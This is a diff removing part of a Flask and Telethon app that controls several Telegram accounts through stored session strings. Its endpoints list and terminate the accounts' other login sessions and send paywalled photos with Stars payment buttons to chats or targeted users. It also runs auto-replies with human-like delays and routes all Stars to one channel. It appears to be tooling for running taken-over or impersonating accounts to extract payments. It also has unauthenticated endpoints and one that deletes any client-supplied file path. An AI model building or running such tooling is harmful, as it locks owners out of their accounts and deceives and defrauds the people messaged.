-            
-            for auth in result.authorizations:
-                session_info = {
-                    'hash': auth.hash,
-                    'device_model': auth.device_model,
-                    'platform': auth.platform,
-                    'system_version': auth.system_version,
-                    'api_id': auth.api_id,
-                    'app_name': auth.app_name,
-                    'app_version': auth.app_version,
-                    'date_created': auth.date_created,
-                    'date_active': auth.date_active,
-                    'ip': auth.ip,
-                    'country': auth.country,
-                    'region': auth.region,
-                    'current': auth.current
-                }
-                
-                if auth.current:
-                    current_hash = auth.hash
-                
-                sessions.append(session_info)
-            
-            return {'success': True, 'sessions': sessions, 'current_hash': current_hash}
-            
-        except FreshResetAuthorisationForbiddenError:
-            return {'success': False, 'error': 'fresh_reset_forbidden'}
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
-    
-    try:
-        result = run_async(get_sessions())
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/terminate-session', methods=['POST'])
-def terminate_session():
-    data = request.json
-    account_id = data.get('accountId')
-    session_hash = data.get('hash')
-    
-    if not account_id or not session_hash:
-        return jsonify({'success': False, 'error': 'Account ID and session hash required'})
-    
-    account = next((acc for acc in accounts if acc['id'] == account_id), None)
-    
-    if not account:
-        return jsonify({'success': False, 'error': 'Account not found'})
-    
-    async def terminate():
-        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            await client(functions.account.ResetAuthorizationRequest(int(session_hash)))
-            return {'success': True}
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
-    
-    try:
-        result = run_async(terminate())
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/terminate-sessions', methods=['POST'])
-def terminate_sessions():
-    data = request.json
-    account_id = data.get('accountId')
-    
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
-    
-    account = next((acc for acc in accounts if acc['id'] == account_id), None)
-    
-    if not account:
-        return jsonify({'success': False, 'error': 'Account not found'})
-    
-    async def terminate():
-        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-        await client.connect()
-        
-        try:
-            result = await client(functions.account.GetAuthorizationsRequest())
-            
-            current_hash = None
-            for auth in result.authorizations:
-                if auth.current:
-                    current_hash = auth.hash
-                    break
-            
-            count = 0
-            for auth in result.authorizations:
-                if auth.hash != current_hash:
-                    try:
-                        await client(functions.account.ResetAuthorizationRequest(auth.hash))
-                        count += 1
-                    except:
-                        continue
-            
-            return {'success': True, 'message': f'Terminated {count} sessions'}
-            
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
-        finally:
-            await client.disconnect()
-    
-    try:
-        result = run_async(terminate())
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-# ==================== MEDIA UPLOAD & MANAGEMENT API ====================
-
-@app.route('/api/upload-media', methods=['POST'])
-def upload_media():
-    try:
-        if 'file' not in request.files:
-            return jsonify({'success': False, 'error': 'No file provided'})
-        
-        file = request.files['file']
-        prefix = request.form.get('prefix', '')
-        
-        if file.filename == '':
-            return jsonify({'success': False, 'error': 'No file selected'})
-        
-        if not allowed_file(file.filename):
-            return jsonify({'success': False, 'error': 'File type not allowed'})
-        
-        filename = secure_filename(file.filename)
-        new_filename = f"{prefix}{filename}"
-        
-        file_path = os.path.join(UPLOAD_FOLDER, new_filename)
-        file.save(file_path)
-        
-        if 'preview' in prefix:
-            dest_folder = 'tsega_photos/preview'
-            price = 5
-        elif 'full' in prefix and 'video' not in prefix:
-            dest_folder = 'tsega_photos/full'
-            price = 50
-        elif 'premium' in prefix:
-            dest_folder = 'tsega_photos/premium'
-            price = 200
-        else:
-            dest_folder = 'uploads'
-            price = 5
-        
-        os.makedirs(dest_folder, exist_ok=True)
-        dest_path = os.path.join(dest_folder, new_filename)
-        
-        shutil.copy2(file_path, dest_path)
-        
-        media_type = 'photo'
-        
-        conn = sqlite3.connect('stars.db')
-        c = conn.cursor()
-        c.execute('''INSERT INTO media_library 
-                    (file_path, media_type, price_stars, is_active)
-                    VALUES (?, ?, ?, 1)''',
-                 (dest_path, media_type, price))
-        conn.commit()
-        conn.close()
-        
-        return jsonify({
-            'success': True,
-            'filename': new_filename,
-            'path': dest_path,
-            'price': price
-        })
-        
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/delete-media', methods=['POST'])
-def delete_media():
-    try:
-        data = request.json
-        file_path = data.get('path')
-        
-        if not file_path:
-            return jsonify({'success': False, 'error': 'No file path provided'})
-        
-        conn = sqlite3.connect('stars.db')
-        c = conn.cursor()
-        c.execute("UPDATE media_library SET is_active = 0 WHERE file_path = ?", (file_path,))
-        conn.commit()
-        conn.close()
-        
-        if os.path.exists(file_path):
-            os.remove(file_path)
-        
-        return jsonify({'success': True, 'message': 'Media deleted'})
-        
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/stars/transactions', methods=['GET'])
-def get_transactions():
-    try:
-        conn = sqlite3.connect('stars.db')
-        c = conn.cursor()
-        c.execute('''SELECT user_id, amount, transaction_type, timestamp 
-                    FROM star_transactions ORDER BY timestamp DESC LIMIT 50''')
-        transactions = c.fetchall()
-        conn.close()
-        
-        return jsonify({
-            'success': True,
-            'transactions': [{
-                'user_id': t[0],
-                'amount': t[1],
-                'type': t[2],
-                'time': t[3]
-            } for t in transactions]
-        })
-        
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/send-paid-photo', methods=['POST'])
-def send_paid_photo():
-    """Send a photo with payment button to a specific chat"""
-    try:
-        data = request.json
-        if not data:
-            return jsonify({'success': False, 'error': 'No data received'})
-        
-        account_id = data.get('accountId')
-        chat_id = data.get('chatId')
-        photo_path = data.get('photoPath')
-        star_amount = data.get('starAmount', 5)
-        
-        if not account_id:
-            return jsonify({'success': False, 'error': 'Account ID required'})
-        if not chat_id:
-            return jsonify({'success': False, 'error': 'Chat ID required'})
-        if not photo_path:
-            return jsonify({'success': False, 'error': 'Photo path required'})
-        
-        account = next((acc for acc in accounts if acc['id'] == account_id), None)
-        if not account:
-            return jsonify({'success': False, 'error': 'Account not found'})
-        
-        # Check if photo exists
-        if not os.path.exists(photo_path):
-            found_path = find_media_file(photo_path)
-            if found_path:
-                photo_path = found_path
-            else:
-                return jsonify({'success': False, 'error': 'Photo file not found'})
-        
-        async def send():
-            client = None
-            try:
-                client = TelegramClient(
-                    StringSession(account['session']), 
-                    API_ID, 
-                    API_HASH,
-                    connection_retries=3,
-                    timeout=30
-                )
-                
-                await client.connect()
-                
-                if not await client.is_user_authorized():
-                    return {'success': False, 'error': 'Account not authorized'}
-                
-                # Get entity
-                try:
-                    entity = await client.get_entity(int(chat_id))
-                except:
-                    try:
-                        entity = await client.get_entity(str(chat_id))
-                    except Exception as e:
-                        return {'success': False, 'error': f'Chat not found'}
-                
-                # Determine caption
-                if star_amount == 5:
-                    caption = "🔒 **Preview Photo**\n\nUnlock this exclusive preview for 5 ⭐!\n\nTap below to unlock!"
-                elif star_amount == 50:
-                    caption = "🔒 **Full Quality Photo**\n\nUnlock this high quality photo for 50 ⭐!\n\nTap below to unlock!"
-                elif star_amount == 200:
-                    caption = "🔒 **Premium Content**\n\nUnlock this premium photo for 200 ⭐!\n\nTap below to unlock!"
-                else:
-                    caption = f"🔒 **Exclusive Content**\n\nUnlock this photo for {star_amount} ⭐!\n\nTap below to unlock!"
-                
-                # Send photo with payment button
-                await client.send_file(
-                    entity,
-                    photo_path,
-                    caption=caption,
-                    buttons=[
-                        [Button.payment(star_amount)],
-                        [Button.url("💰 Buy Stars", "https://t.me/stars?start=recharge")]
-                    ],
-                    parse_mode='markdown'
-                )
-                
-                return {'success': True, 'message': 'Photo sent with payment button'}
-                
-            except Exception as e:
-                return {'success': False, 'error': str(e)}
-            finally:
-                if client:
-                    try:
-                        await client.disconnect()
-                    except:
-                        pass
-        
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        try:
-            result = loop.run_until_complete(send())
-            return jsonify(result)
-        finally:
-            loop.close()
-        
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/send-to-user', methods=['POST'])
-def send_to_user():
-    """Send photo to specific user by username/phone"""
-    try:
-        data = request.json
-        account_id = data.get('accountId')
-        target = data.get('target')
-        photo_path = data.get('photoPath')
-        star_amount = data.get('starAmount', 5)
-        
-        if not account_id:
-            return jsonify({'success': False, 'error': 'Account ID required'})
-        if not target:
-            return jsonify({'success': False, 'error': 'Target username/phone required'})
-        if not photo_path:
-            return jsonify({'success': False, 'error': 'Photo path required'})
-        
-        account = next((acc for acc in accounts if acc['id'] == account_id), None)
-        if not account:
-            return jsonify({'success': False, 'error': 'Account not found'})
-        
-        if not os.path.exists(photo_path):
-            found_path = find_media_file(photo_path)
-            if found_path:
-                photo_path = found_path
-            else:
-                return jsonify({'success': False, 'error': 'Photo file not found'})
-        
-        async def send():
-            client = None
-            try:
-                client = TelegramClient(
-                    StringSession(account['session']), 
-                    API_ID, 
-                    API_HASH,
-                    connection_retries=3,
-                    timeout=30
-                )
-                
-                await client.connect()
-                
-                if not await client.is_user_authorized():
-                    return {'success': False, 'error': 'Account not authorized'}
-                
-                # Get entity by username or phone
-                try:
-                    if target.startswith('@'):
-                        entity = await client.get_entity(target)
-                    elif target.startswith('+'):
-                        entity = await client.get_entity(target)
-                    else:
-                        entity = await client.get_entity('@' + target)
-                except Exception as e:
-                    return {'success': False, 'error': f'User not found: {target}'}
-                
-                if star_amount == 5:
-                    caption = "🔒 **Preview Photo**\n\nUnlock this exclusive preview for 5 ⭐!\n\nTap below to unlock!"
-                elif star_amount == 50:
-                    caption = "🔒 **Full Quality Photo**\n\nUnlock this high quality photo for 50 ⭐!\n\nTap below to unlock!"
-                elif star_amount == 200:
-                    caption = "🔒 **Premium Content**\n\nUnlock this premium photo for 200 ⭐!\n\nTap below to unlock!"
-                else:
-                    caption = f"🔒 **Exclusive Content**\n\nUnlock this photo for {star_amount} ⭐!\n\nTap below to unlock!"
-                
-                await client.send_file(
-                    entity,
-                    photo_path,
-                    caption=caption,
-                    buttons=[
-                        [Button.payment(star_amount)],
-                        [Button.url("💰 Buy Stars", "https://t.me/stars?start=recharge")]
-                    ],
-                    parse_mode='markdown'
-                )
-                
-                return {'success': True, 'message': f'Photo sent to {target}'}
-                
-            except Exception as e:
-                return {'success': False, 'error': str(e)}
-            finally:
-                if client:
-                    try:
-                        await client.disconnect()
-                    except:
-                        pass
-        
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        try:
-            result = loop.run_until_complete(send())
-            return jsonify(result)
-        finally:
-            loop.close()
-        
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/media/<path:filename>')
-def serve_media(filename):
-    """Serve media files"""
-    file_path = find_media_file(filename)
-    
-    if file_path and os.path.exists(file_path):
-        return send_file(file_path)
-    
-    return jsonify({'error': 'File not found'}), 404
-
-# ==================== STAR STATS API ====================
-
-@app.route('/api/stars/stats', methods=['GET'])
-def star_stats():
-    try:
-        conn = sqlite3.connect('stars.db')
-        c = conn.cursor()
-        
-        c.execute("SELECT SUM(amount) FROM star_transactions")
-        total_earned = c.fetchone()[0] or 0
-        
-        c.execute("SELECT SUM(amount) FROM star_transactions WHERE date(timestamp) = date('now')")
-        today_earned = c.fetchone()[0] or 0
-        
-        c.execute("SELECT SUM(total_stars) FROM channel_earnings")
-        channel_total = c.fetchone()[0] or 0
-        
-        c.execute("SELECT COUNT(*) FROM media_library WHERE is_active = 1")
-        total_media = c.fetchone()[0] or 0
-        
-        c.execute("SELECT SUM(times_sold) FROM media_library")
-        total_media_sold = c.fetchone()[0] or 0
-        
-        conn.close()
-        
-        return jsonify({
-            'success': True,
-            'total_stars_earned': total_earned,
-            'today_stars_earned': today_earned,
-            'channel_total': channel_total,
-            'total_media': total_media,
-            'total_media_sold': total_media_sold
-        })
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/stars/media', methods=['GET'])
-def list_media():
-    try:
-        conn = sqlite3.connect('stars.db')
-        c = conn.cursor()
-        c.execute('''SELECT file_path, media_type, price_stars, times_sold, last_sold
-                    FROM media_library WHERE is_active = 1''')
-        media = c.fetchall()
-        conn.close()
-        
-        return jsonify({
-            'success': True,
-            'total': len(media),
-            'media': [{
-                'path': m[0], 
-                'type': m[1], 
-                'price': m[2], 
-                'sold': m[3],
-                'last_sold': m[4]
-            } for m in media]
-        })
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/reconnect', methods=['GET'])
-def reconnect_all():
-    for account_key in list(active_clients.keys()):
-        stop_auto_reply_for_account(int(account_key))
-    
-    time.sleep(2)
-    start_all_auto_replies()
-    
-    return jsonify({
-        'success': True,
-        'message': 'Reconnecting all accounts',
-        'active': len(active_clients)
-    })
-
-@app.route('/api/health', methods=['GET'])
-def health_check():
-    return jsonify({
-        'status': 'healthy',
-        'accounts': len(accounts),
-        'auto_reply_active': len(active_clients),
-        'active_accounts': list(active_clients.keys()),
-        'time': datetime.now().isoformat()
-    })
-
-# ==================== STARTUP ====================
-
-def start_auto_reply_thread():
-    time.sleep(5)
-    logger.info("Starting auto-reply for enabled accounts...")
-    start_all_auto_replies()
-
-if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    
-    logger.info("💰 Initializing Star Earning System...")
-    star_db = StarDatabase()
-    media_manager = MediaManager()
-    
-    print('\n' + '='*70)
-    print('🤖 TSEGA - PERFECT AUTO-REPLY VERSION')
-    print('='*70)
-    print(f'✅ Port: {port}')
-    print(f'✅ Accounts loaded: {len(accounts)}')
-    print(f'✅ Stars go to: {StarConfig.CHANNEL_USERNAME}')
-    
-    for acc in accounts:
-        status = "ENABLED" if str(acc['id']) in reply_settings and reply_settings[str(acc['id'])].get('enabled') else "DISABLED"
-        print(f'   • {acc.get("name")} ({acc.get("phone")}) - {status}')
-    
-    print('\n💰 STAR PRICING:')
-    for item, price in StarConfig.STAR_PRICES.items():
-        print(f'   • {item}: {price} ⭐')
-    
-    print('\n🚀 FEATURES:')
-    print('   • ✅ NO "wendme" or "brother" - removed')
-    print('   • ✅ Perfect intent detection')
-    print('   • ✅ Natural responses with 15-40 sec delay')
-    print('   • ✅ Payment buttons for photo requests')
-    print('   • ✅ ALL STARS go to @Abe_army')
-    print('='*70 + '\n')
-    
-    threading.Thread(target=keep_alive, daemon=True).start()
-    
-    threading.Thread(target=start_auto_reply_thread, daemon=True).start()
-    
-    app.run(host='0.0.0.0', port=port, debug=False)
